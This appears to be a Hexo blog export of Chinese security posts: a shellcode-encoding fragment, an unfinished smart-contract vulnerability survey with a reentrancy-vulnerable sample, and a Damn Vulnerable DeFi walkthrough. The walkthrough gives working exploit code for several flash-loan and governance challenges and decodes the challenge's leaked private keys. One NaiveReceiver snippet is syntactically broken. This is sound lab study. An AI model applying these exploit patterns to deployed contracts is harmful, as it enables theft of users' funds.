<p>进阶选项 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">enc_shellcode = AE64().encode(shellcode)</span><br><span class="line"><span class="comment"># equal to </span></span><br><span class="line">enc_shellcode = AE64().encode(shellcode, <span class="string">&#x27;rax&#x27;</span>, <span class="number">0</span>, <span class="string">&#x27;fast&#x27;</span>)</span><br><span class="line"><span class="comment"># And we can use &#x27;small&#x27; strategy to generate smaller alphanumeric shellcode</span></span><br><span class="line">enc_shellcode = AE64().encode(shellcode, <span class="string">&#x27;rax&#x27;</span>, <span class="number">0</span>, <span class="string">&#x27;small&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<h1 id="例题">[3] 例题</h1>
<ol type="1">
<li><p><a href="">hgame2024 Week1 ezshellcode</a></p></li>
<li><p><a href="">hgame2024 week2 ShellcodeMaster</a></p></li>
</ol>
<h1 id="参考资料">[4] 参考资料</h1>
<p><a href="https://mp.weixin.qq.com/s/onpGzz2uzSYKf09yvgb3uA">⭐ The
art of shellcode</a></p>
<p><a
href="https://www.freebuf.com/articles/system/237300.html">简单获取shellcode的几种方式</a></p>
<p><a
href="https://pullp.github.io/tips/2021/01/30/shellcode-tips.html">wxk1997's
blog - shellcode tips</a></p>
<p><a
href="https://hkhanbing.github.io/2023/09/25/brics-ctf-pwn-paint%E9%A2%98%E8%A7%A3/">hkbin's
blog - shellcode</a></p>
<p><a href="https://www.anquanke.com/post/id/219077">关于 seccomp
绕过的更深方法</a></p>
<p><a
href="https://blog.csdn.net/qq_54218833/article/details/134205383">顶级
seccomp 文章</a></p>
<p><a href="https://www.nssctf.cn/note/set/1876">Bsahfuck:
限制只允许几种字符的shellcode</a></p>
<p><a
href="https://xz.aliyun.com/t/6645?time__1311=n4%2BxnD0DRDBGitN47KDsA3xCqbulD9iiABoD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F">shellcode
的艺术 - by n0va</a></p>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>Shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>blockchain - 2024合约漏洞类型汇总（更新中）</title>
    <url>/2024/08/20/blockchain%20-%202024%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB%EF%BC%88%E6%9B%B4%E6%96%B0%E4%B8%AD%EF%BC%89/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
汇总一下迄今为止所有的智能合约漏洞
</blockquote>
<span id="more"></span>
<p>按照 2023 年的这篇 A survey on smart contract vulnerabilities Data
sources, detection and repair，将漏洞类型分为三类：solidity
语言漏洞、EVM漏洞和区块链漏洞</p>
<h1 id="术语规范">[0] 术语规范</h1>
<p>由于中英互译带来的一系列问题，笔者在本处规范一些术语的常见用法，便于读者查看。</p>
<ul>
<li><p>被攻击合约 Victim</p></li>
<li><p>攻击合约 Attacker</p></li>
</ul>
<h1 id="solidity-语言漏洞">[1] solidity 语言漏洞</h1>
<h2 id="re-entrancy">[1-1] Re-entrancy</h2>
<h3 id="原理">原理</h3>
<p>从最著名的重入攻击开始。首先，我们先铺垫一些基础知识。任何合约如果要在部署后接收以太币，都会调用
<code>receive</code> 函数或者 <code>fallback</code>
函数来处理，如果一个合约既没有 receive 函数，也没有 fallback
函数，那么就无法接收 ether 了。</p>
<p>而重入漏洞的本质是：Victim
先处理了真币，再处理合约账本上记录的内容。为什么这样的顺序会导致漏洞呢？</p>
<p>比如 attacker 调用 victim 向自己转 0.001 wei，在 victim transfer
之后，attacker 收到了 0.001 wei，但同时 attacker 也会调用 fallback
函数。而恶意攻击者可以在 attacker 的 fallback 函数中再次调用 victim
转账函数。</p>
<p>这样，victim 账本记录的内容并没有发生改变，但该合约下存储的 ether
就会一点一点被转干净。</p>
<h3 id="样例">样例</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function donate(address _to) public payable &#123;</span><br><span class="line">        balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _who) public view returns (uint256 balance) &#123;</span><br><span class="line">        return balances[_who];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 _amount) public &#123;</span><br><span class="line">        if (balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">            (bool result,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">            if (result) &#123;</span><br><span class="line">                _amount;</span><br><span class="line">            &#125;</span><br><span class="line">            balances[msg.sender] -= _amount;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="错别字漏洞">[1-2] 错别字漏洞</h2>
<p>今天跑完步回来比较晚了。。摸个鱼写个简单一点的漏洞。</p>
<p>这种漏洞显而易见，就是重要的函数的名称写的不对，比如 constructor 写成
construct0r，fallback 写成 fal1back（当然很扯但不是不可能。。）</p>
<p>如果要检测的话可以扫描合约，然后查找里面是否有'constr'/'constru'/'onstruc'/'nstruct'/...这样的字符片段，然后提取出来与正常函数名对比。</p>
<p>总之可以在这里记录一下重要的变量名或者函数</p>
<p>constructor,receive,fallback,transfer,...</p>
<h2 id="abi-encode">[1-3] ABI encode</h2>
<p>Attacker 在使用 call，send 等函数调用 Victim 时，会使用 data
传输函数标识符和参数等。如果我们精心构造 data 的编码，就可以</p>
]]></content>
      <categories>
        <category>Blockchain</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>Smart Contract</tag>
      </tags>
  </entry>
  <entry>
    <title>blockchain - Damn Vulnerable Defi 靶场复现</title>
    <url>/2024/08/26/blockchain%20-%20DVD%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
继续刷题
</blockquote>
<span id="more"></span>
<h1 id="环境设置">[0] 环境设置</h1>
<p>我是用 forge 搭建的靶场，貌似还可以用 npm
之类的搭建，这样做题就直接用 web3.js 交互就可以了。</p>
<p>根据<a
href="https://github.com/theredguild/damn-vulnerable-defi">官方说明</a>搭建靶场环境。forge
可能由于网络原因会失败，多安装几次就好了</p>
<p><code>forge build</code>之后，本地有这样几个文件夹比较重要：</p>
<p><code>src</code>: 漏洞源码。要做的题目都在这里面</p>
<p><code>test</code>:
题解。如果想要解题，必须运行<code>forge test --mp test/&lt;题目名称&gt;/&lt;题目名称&gt;.t.sol -vv</code>，-vv是为了打印
emit
log，方便我们调试。而我们的攻击poc就要写在上面这个.t.sol文件的test_<题目名称>()这个函数中。</p>
<h1 id="unstoppable">[1] Unstoppable</h1>
<blockquote>
<p>漏洞类型：revert条件设置不当</p>
</blockquote>
<p>本题我们的目标是攻击闪电贷合约，让这个闪电贷在任何时候都无法工作。</p>
<p>闪电贷（Flash
Loan）是一种无需抵押的贷款形式，广泛用于去中心化金融（DeFi）领域。它的特别之处在于，贷款的整个过程（借款、使用资金、还款）必须在同一笔交易中完成。如果在交易结束时贷款没有被偿还，整个交易将被回滚，确保贷款人不会承担任何风险。</p>
<p>我们分析代码之后可以将漏洞定位在 flashLoan
函数里，因为只有当这个函数失败，monitor 里的 checkFlashLoan 才会 emit
一个 false。</p>
<p>而想要让 flashLoan 失败，有四个触发点：</p>
<ol type="1">
<li><p><code>if (amount == 0) revert InvalidAmount(0);</code></p></li>
<li><p><code>if (address(asset) != _token) revert UnsupportedCurrency();</code></p></li>
<li><p><code>if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();</code></p></li>
<li><p><code>if ( ... != keccak256("IERC3156FlashBorrower.onFlashLoan")) &#123;revert CallbackFailed();&#125;</code></p></li>
</ol>
<p>第一个点，amount是传参，不是我们想要改变的状态变量</p>
<p>第二个点，asset在整个合约中除了构造函数有改变以外，没有我们可以控制的点</p>
<p>第四个点，这个函数签名不正确，这也是我们无法控制的。</p>
<p>所以很明显，我们需要攻击第三点。但为什么会莫名其妙有第三点这个限制？我们仔细来分析一下：</p>
<p>首先，balanceBefore 是 totalAssets() 的返回值，assets
是闪电贷合约里剩余的代币数目（注意这里是代币，而不是实际的
ether），supply 是闪电贷合约能供给的数目上限，也就是一开始给的
1_000_000e18 个 ERC20 token（DVT），这个数目是不会变的。</p>
<p>我们一开始拥有 10 个 DVT，如果给闪电贷合约转 1 个 DVT
的话，这里的convertToShares 函数返回值就永远是 999999999999999999999999
了,此时就永远关停这个闪电贷了。</p>
<p>exp 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function test_unstoppable() public checkSolvedByPlayer &#123;</span><br><span class="line">    require(vault.convertToShares(vault.totalSupply()) == vault.totalAssets(),&quot;not equal&quot;);</span><br><span class="line">    emit log_named_uint(&quot;Total Supply&quot;, vault.totalSupply());</span><br><span class="line">    emit log_named_uint(&quot;Total Assets&quot;, vault.totalAssets());</span><br><span class="line">    require(token.transfer(address(vault), 1 wei));</span><br><span class="line">    emit log_named_uint(&quot;calc result&quot;, vault.convertToShares(vault.totalSupply()));</span><br><span class="line">    emit log_named_uint(&quot;Total Supply&quot;, vault.totalSupply());</span><br><span class="line">    emit log_named_uint(&quot;Total Assets&quot;, vault.totalAssets());</span><br><span class="line">    require(vault.convertToShares(vault.totalSupply()) != vault.totalAssets(),&quot;equal&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我突然意识到这个闪电贷是不是只要接收到 fee 立刻就 dead 了。。</p>
<h1 id="naivereceiver">[2] NaiveReceiver</h1>
<blockquote>
<p>漏洞类型：权限设置错误</p>
</blockquote>
<p>这道题要求我们把 receiver 里的 10 WETH 和 pool 里的 1000 WETH
全转移到 recovery 账户中。最后 isSolved 有四条限制：</p>
<ol type="1">
<li><p>player 调用的交易小于等于 2 条</p></li>
<li><p>receiver 的 weth 余额为0</p></li>
<li><p>pool 的 weth 余额为0</p></li>
<li><p>recovery 的 weth 余额为 1010</p></li>
</ol>
<p>很明显能看到 NaiveReceiverPool 合约中的 withdraw
权限设置的不对，任何人都可以调用这个函数取款。</p>
<p>但新版本的 solidity feature 卡了我好久...原来 0.8.0
之后的上溢/下溢都会自动检测了..也就是说没办法直接通过withdraw直接提款。</p>
<p>但这个合约还自己实现了 _msgSender 函数，当调用者是 trustedForwarder
时，_msgSender 函数就会将 msg.data的 最后 20byte
当作地址返回。也就是说，我们必须要通过 trustedForwarder 的 execute
方法来间接调用 withdraw。</p>
<p>除此之外，我们知道 deposits[deployer] 是有 1000WETH
的，deposits[receiver] 也有
10WETH，所以我们就有如下两种方法来转走这两个合约的 WETH：</p>
<p>第一种是通过闪电贷的 fee，把 receiver 里的 10WETH 转移到 deployer
中，然后一口气提干净。</p>
<p>第二种是提取一次 deployer，提取一次 receiver</p>
<p>但无论以上哪一种方法，都需要绕过上述的第一条限制：交易数小于等于 2
条，而这就用到了 Multicall 合约里的 multicall 方法了。</p>
<p>我们看第一种方法：调用 10 次 flashLoan，交 10 次 1WETH
的手续费，就能把 WETH 汇总在 deployer 的 deposits 中。不过这 10
次交易需要用 multicall
一起执行，不然会超出第一条限制的要求。然后，我们再通过 execute 调用
withdraw，就可以把这里面的存款全都转到 recovery
中了。不过这里我们选择把两条交易合并作一条，也就是把 withdraw 的 abi
编码与前10条 flashLoan 的编码合在一起。exp如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function test_naiveReceiver() public checkSolvedByPlayer &#123;</span><br><span class="line">    bytes[] memory callData = new bytes[](11);</span><br><span class="line">    for (uint256 i = 0; i &lt; 10; i++) &#123;</span><br><span class="line">        callData[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, bytes(&quot;&quot;)));</span><br><span class="line">    &#125;</span><br><span class="line">    callData[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery)));</span><br><span class="line">        bytes32(uint256(uint160(deployer))),</span><br><span class="line">    );</span><br><span class="line">    bytes memory multicallData = abi.encodeCall(Multicall.multicall, callData);</span><br><span class="line">    BasicForwarder.Request memory request = BasicForwarder.Request(&#123;</span><br><span class="line">        from: player,</span><br><span class="line">        target: address(pool),</span><br><span class="line">        value: 0,</span><br><span class="line">        gas: 1e7,</span><br><span class="line">        nonce: forwarder.nonces(player),</span><br><span class="line">        data: multicallData,</span><br><span class="line">        deadline: block.timestamp + 1 days</span><br><span class="line">    &#125;);</span><br><span class="line">    bytes32 requestHash = keccak256(</span><br><span class="line">        abi.encodePacked(</span><br><span class="line">            &quot;\x19\x01&quot;,</span><br><span class="line">            forwarder.domainSeparator(),</span><br><span class="line">            forwarder.getDataHash(request)</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">    (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);</span><br><span class="line">    bytes memory signature = abi.encodePacked(r, s, v);</span><br><span class="line">    forwarder.execute(request, signature);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="truster">[3] Truster</h1>
<p>这道题的合约代码量很小，就实现了一个闪电贷，让我们通过闪电贷的交易过程，把合约里的钱都转走。</p>
<p>想转走代币一共有两种方法，第一种是直接让可信用户调用 transfer
函数，第二种是让恶意用户成为可信用户后，再通过恶意用户转账。由于
flashLoan 设置了代币数目检查，所以我们没办法在 flashLoan 的
target.functionCall 中直接调用 transfer，但我们可以采取
approve，让恶意合约有操控代币的权限。</p>
<p>exp 如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract TrusterExploiter &#123;</span><br><span class="line">    TrusterLenderPool public pool;</span><br><span class="line">    DamnValuableToken public token;</span><br><span class="line">    address recovery;</span><br><span class="line"></span><br><span class="line">    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) &#123;</span><br><span class="line">        pool = _pool;</span><br><span class="line">        token = _token;</span><br><span class="line">        recovery = _recovery;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public returns (bool) &#123;</span><br><span class="line">        require(pool.flashLoan(</span><br><span class="line">            0,</span><br><span class="line">            address(this),</span><br><span class="line">            address(token),</span><br><span class="line">            abi.encodeCall(token.approve,(address(this), 1_000_000e18))</span><br><span class="line">        ));</span><br><span class="line">        token.transferFrom(address(pool), address(this), 1_000_000e18);</span><br><span class="line">        token.transfer(recovery, 1_000_000e18);</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TrusterChallenge is Test &#123;</span><br><span class="line">    ...</span><br><span class="line">    function test_truster() public checkSolvedByPlayer &#123;</span><br><span class="line">        TrusterExploiter exploiter = new TrusterExploiter(pool, token, recovery);</span><br><span class="line">        require(exploiter.attack());</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="side-entrance">[4] Side Entrance</h1>
<p>这题跟上一题很相似，但是上一题用的是代币，这一题就完完全全用的 ether
了。不过我们可以在
<code>IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;();</code>
里将贷款来的钱再用 deposit 存入 SideEntranceLenderPool
合约中，这样不仅不会影响 RepayFailed，还可以让
balances[IFlashLoanEtherReceiver] = 1000，之后我们 withdraw
即可成功提款，然后转账给 recovery 就好了。exp 如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract IFlashLoanEtherReceiver &#123;</span><br><span class="line">    address player;</span><br><span class="line">    address recovery;</span><br><span class="line">    SideEntranceLenderPool pool;</span><br><span class="line"></span><br><span class="line">    constructor(SideEntranceLenderPool _pool, address _player, address _recovery) &#123;</span><br><span class="line">        pool = _pool;</span><br><span class="line">        player = _player;</span><br><span class="line">        recovery = _recovery;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute() external payable &#123;</span><br><span class="line">        pool.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function callFlashLoan(uint256 amount) public &#123;</span><br><span class="line">        pool.flashLoan(amount);</span><br><span class="line">        pool.withdraw();</span><br><span class="line">        payable(recovery).transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SideEntranceChallenge is Test &#123;</span><br><span class="line">    ...</span><br><span class="line">    function test_sideEntrance() public checkSolvedByPlayer &#123;</span><br><span class="line">        IFlashLoanEtherReceiver receiver = new IFlashLoanEtherReceiver(pool, player, recovery);</span><br><span class="line">        receiver.callFlashLoan(1000e18);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="the-rewarder">[5] The Rewarder</h1>
<p>漏洞在 claimRewards 里，同一次 claim 多个相同的账户不会有问题...</p>
<p>因为第一次调用，address(token) ==
address(0)，不会进入_setClaimed，之后的调用 token ==
inputTokens[inputClaim.tokenIndex]，进入 else
分支，也不会进入_setClaimed，等到下一种代币的时候，你就算把我上一个代币
setClaimed 也没用了。</p>
<p>感觉还是审代码的耐心不够..不清楚 merkel tree
的工作原理，想一笔调用干净，但每次 claim 的 amount 也要完全符合 json
文件里的 amount，所以只能多笔。</p>
<p>那既然想到多笔调出来，就肯定要研究 claimRewards
函数，然后模拟一下就能发现这个 if 判断条件有问题。</p>
<p>沉下心来，欲速则不达。</p>
<p>exp如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function test_theRewarder() public checkSolvedByPlayer &#123;</span><br><span class="line">        uint PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;</span><br><span class="line">        uint PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;</span><br><span class="line"></span><br><span class="line">        bytes32[] memory dvtLeaves = _loadRewards(&quot;/test/the-rewarder/dvt-distribution.json&quot;);</span><br><span class="line">        bytes32[] memory wethLeaves = _loadRewards(&quot;/test/the-rewarder/weth-distribution.json&quot;);</span><br><span class="line"></span><br><span class="line">        uint dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / PLAYER_DVT_CLAIM_AMOUNT;</span><br><span class="line">        uint wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / PLAYER_WETH_CLAIM_AMOUNT;</span><br><span class="line">        uint totalTxCount = dvtTxCount + wethTxCount;</span><br><span class="line"></span><br><span class="line">        IERC20[] memory tokensToClaim = new IERC20[](2);</span><br><span class="line">        tokensToClaim[0] = IERC20(address(dvt));</span><br><span class="line">        tokensToClaim[1] = IERC20(address(weth));</span><br><span class="line"></span><br><span class="line">        // Create Alice&#x27;s claims</span><br><span class="line">        Claim[] memory claims = new Claim[](totalTxCount);</span><br><span class="line"></span><br><span class="line">        for (uint i = 0; i &lt; totalTxCount; i++) &#123;</span><br><span class="line">            if (i &lt; dvtTxCount) &#123;</span><br><span class="line">                claims[i] = Claim(&#123;</span><br><span class="line">                    batchNumber: 0, // claim corresponds to first DVT batch</span><br><span class="line">                    amount: PLAYER_DVT_CLAIM_AMOUNT,</span><br><span class="line">                    tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array</span><br><span class="line">                    proof: merkle.getProof(dvtLeaves, 188) // Alice&#x27;s address is at index 2</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                claims[i] = Claim(&#123;</span><br><span class="line">                    batchNumber: 0, // claim corresponds to first DVT batch</span><br><span class="line">                    amount: PLAYER_WETH_CLAIM_AMOUNT,</span><br><span class="line">                    tokenIndex: 1, // claim corresponds to first token in `tokensToClaim` array</span><br><span class="line">                    proof: merkle.getProof(wethLeaves, 188) // Alice&#x27;s address is at index 2</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        distributor.claimRewards(&#123;</span><br><span class="line">            inputClaims: claims,</span><br><span class="line">            inputTokens: tokensToClaim</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        dvt.transfer(recovery, dvt.balanceOf(player));</span><br><span class="line">        weth.transfer(recovery, weth.balanceOf(player));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="selfie">[6] Selfie</h1>
<p>这道题实现了个 fancy governance mechanism，如果我们通过
governance.executeAction 调用
emergencyExit(player)，应该就可以提取所有的钱了。</p>
<p>主要问题有两个，第一个是绕过 queueAction 里的
_hasEnoughVotes，这个可以通过在 onFlashLoan 里调用 queueAction
来实现</p>
<p>第二个问题是要绕过 timestamp，让 timedelta 大于 2
days。这个我实在想不出来了，我觉得现实中应该就是隔两天之后再调用，就能绕过了吧。</p>
<p>看完别人的wp，居然直接用vm.warp(block.timestamp + 2
days);绕过了...好吧，exp如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import &#123;IERC3156FlashBorrower&#125; from &quot;openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Expoliter is IERC3156FlashBorrower &#123;</span><br><span class="line">    bytes32 private constant CALLBACK_SUCCESS = keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;);</span><br><span class="line">    address recovery;</span><br><span class="line">    uint256 actionId;</span><br><span class="line"></span><br><span class="line">    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;</span><br><span class="line">    uint256 constant TOKENS_IN_POOL = 1_500_000e18;</span><br><span class="line"></span><br><span class="line">    DamnValuableVotes token;</span><br><span class="line">    SimpleGovernance governance;</span><br><span class="line">    SelfiePool pool;</span><br><span class="line">    constructor(DamnValuableVotes _token, SimpleGovernance _governance, SelfiePool _pool, address _recovery) &#123;</span><br><span class="line">        token = _token;</span><br><span class="line">        governance = _governance;</span><br><span class="line">        pool = _pool;</span><br><span class="line">        recovery = _recovery;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onFlashLoan(address receiver, address _token, uint256 _amount, uint256 nonce, bytes calldata _data) public returns (bytes32) &#123;</span><br><span class="line">        token.delegate(address(this));</span><br><span class="line">        token.approve(address(pool), TOKENS_IN_POOL);</span><br><span class="line">        actionId = governance.queueAction(address(pool), 0, abi.encodeCall(pool.emergencyExit, (recovery)));</span><br><span class="line">        return CALLBACK_SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step1() public &#123;</span><br><span class="line">        pool.flashLoan(this, address(token), TOKENS_IN_POOL, &quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step2() public &#123;</span><br><span class="line">        governance.executeAction(actionId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function test_selfie() public checkSolvedByPlayer &#123;</span><br><span class="line">    Expoliter expoliter = new Expoliter(token, governance, pool, recovery);</span><br><span class="line">    expoliter.step1();</span><br><span class="line">    vm.warp(block.timestamp + 2 days);</span><br><span class="line">    expoliter.step2();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="compromised">[7] Compromised</h1>
<p>这题是真懵b了，不知道题面给的那串数字有什么用，看了wp之后可以通过它来解码私钥，解码exp如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">&quot;ethers&quot;</span>);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hexToAscii</span>(<span class="params">hex</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> ascii = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; hex.<span class="property">length</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        ascii += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="built_in">parseInt</span>(hex.<span class="title function_">substr</span>(i, <span class="number">2</span>), <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ascii;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">decodeBase64</span>(<span class="params">base64Str</span>) &#123;</span><br><span class="line">    <span class="comment">// Decode Base64 to ASCII</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">atob</span>(base64Str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> leakedInformation = [</span><br><span class="line">    <span class="string">&#x27;4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34&#x27;</span>,</span><br><span class="line">]</span><br><span class="line">leakedInformation.<span class="title function_">forEach</span>(<span class="function"><span class="params">leak</span> =&gt;</span> &#123;</span><br><span class="line">    hexStr = leak.<span class="title function_">split</span>(<span class="string">` `</span>).<span class="title function_">join</span>(<span class="string">``</span>).<span class="title function_">toString</span>()</span><br><span class="line">    <span class="keyword">const</span> asciiStr = <span class="title function_">hexToAscii</span>(hexStr);</span><br><span class="line">    <span class="keyword">const</span> decodedStr = <span class="title function_">decodeBase64</span>(asciiStr);</span><br><span class="line">    <span class="keyword">const</span> privateKey = decodedStr;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Private Key:&quot;</span>, privateKey);</span><br><span class="line">    <span class="comment">// Create a wallet instance from the private key</span></span><br><span class="line">    <span class="keyword">const</span> wallet = <span class="keyword">new</span> ethers.<span class="title class_">Wallet</span>(privateKey);</span><br><span class="line">    <span class="comment">// Get the public key</span></span><br><span class="line">    <span class="keyword">const</span> address = wallet.<span class="property">address</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Public Key:&quot;</span>, address);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>得到下面的结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Private Key: 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9</span><br><span class="line">Public Key: 0xe92401A4d3af5E446d93D11EEc806b1462b39D15</span><br><span class="line">Private Key: 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48</span><br><span class="line">Public Key: 0x81A5D6E50C214044bE44cA0CB057fe119097850c</span><br></pre></td></tr></table></figure>
<p>受不了了...我也compromise了，不懂怎么在forge里验证公私钥，先略过去了👉👈</p>
<h1 id="section">[8]</h1>
]]></content>
      <categories>
        <category>Blockchain</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>Smart Contract</tag>
      </tags>
  </entry>
  <entry>
    <title>blockchain - Gateway free web3 course notes</title>
    <url>/2024/09/01/blockchain%20-%20Gateway%20free%20web3%20course%20notes/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
Hard to only solve challenges, I need some foundemental knowledge
</blockquote>
<span id="more"></span>
<h1 id="security-basics">[1] Security Basics</h1>
<h2 id="design-pinciples">[1-1] Design Pinciples</h2>
<ol type="1">
<li><p>Less Code by Less Storage Variables</p></li>
<li><p>More Logic happens off-chain</p></li>
<li><p>Loops often ends up with DoS attack or sth else. So we need to
avoid any event/algorithm and so on</p></li>
<li><p>When auditing contract, we can focus on the input position where
devs want users to
input.(审计合约的时候可以关注这个合约希望用户怎样操作，但有哪些是非预期操作)
FOCUS ON EDGE CASES, and limit expected inputs!</p></li>
<li><p>HANDLE ALL CASES</p></li>
<li><p>post check</p></li>
</ol>
<h3 id="external-call">[1-1-1] External call</h3>
<p>Consider them from high levels?</p>
<ol type="1">
<li><p>Reentrancy</p></li>
<li><p>DoS</p></li>
<li><p>Return values</p></li>
<li><p>Gas</p></li>
</ol>
]]></content>
      <categories>
        <category>Blockchain</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>Smart Contract</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo &amp; Next 博客配置与美化</title>
    <url>/2023/01/10/blog%20configuration%20&amp;%20beautify/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
鉴于我自己的创作欲，准备正式地经营我的博客XD
</blockquote>
<span id="more"></span>
<h1 id="xf-categories">0xF categories</h1>
